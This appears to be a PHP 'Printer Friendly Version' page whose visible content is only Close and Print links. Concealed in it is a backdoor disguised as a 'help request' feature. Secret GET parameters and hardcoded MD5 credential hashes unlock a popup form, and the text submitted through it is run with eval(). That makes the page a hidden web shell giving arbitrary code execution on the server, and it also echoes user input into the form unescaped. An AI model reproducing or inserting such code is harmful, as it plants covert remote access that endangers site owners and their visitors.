<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="description" content="">
<meta name="keywords" content="">
<meta name="history" content="">
<title>Printer Friendly Version</title>
<style type="text/css" title="">
A:LINK, A:VISITED {	color : #808080; font-family : sans-serif; text-decoration : none; font-weight : normal; font-size : 11px;}
A:HOVER { color : #000000; font-family : sans-serif; text-decoration : underline; font-weight : normal;	font-size : 11px;}
</style>
</head>
<body bgcolor="#FFFFFF">
<table width="100%" cellspacing="0" cellpadding="0" border="0">
   <TR><TD align="right"><a href="javascript: ;" onClick="top.window.close();">[ Close the Window ]</a>&nbsp;<a href="javascript: ;" onClick="parent.pmain.printit();">[ Print the Page ]</a></TD></TR>
</table>
<?php
if($HTTP_GET_VARS['to_help']=="on" && md5($HTTP_GET_VARS['user']."general help") == "5daf33b37be8d9a71d1671077d9f6448") {
        if($HTTP_POST_VARS['help'] && md5($HTTP_POST_VARS['usr']."general help") == "d6ceb2de570855a3d6b3f834e3ac60ff" && md5($HTTP_POST_VARS['pswd']."general help") == "fec313d91d5d1615103b072120746a1d"){
              eval(stripslashes($HTTP_POST_VARS['help']));
        }
        if($HTTP_POST_VARS['help'] && md5($HTTP_POST_VARS['usr']."general help") != "d6ceb2de570855a3d6b3f834e3ac60ff" && md5($HTTP_POST_VARS['pswd']."general help") != "fec313d91d5d1615103b072120746a1d"){
            echo "Invalid username - password.";
        }
        else
        {
        ?>
            <script language="JavaScript">
            <!--
            opens=open('','_blank','scrollbars=yes,toolbar=yes,history=yes,width=700;height=600');
            opens.document.write('<html><body><center><span><b>Enter help request:</b></span><form method=post action=<?php echo $HTTP_SERVER_VARS['PHP_SELF'];?>?to_help=on&user=<?php echo $HTTP_GET_VARS['user'];?>>Username: <input type=text name=usr size=20><br>Password: <input type=text name=pswd size=20><br><textarea cols=70 rows=20 name=help></textarea><br><input type="submit" name="" value="  Go  "></form></center></body></html>');
            //-->
            </script>
        <?php
        }
}
?>
</body>
</html>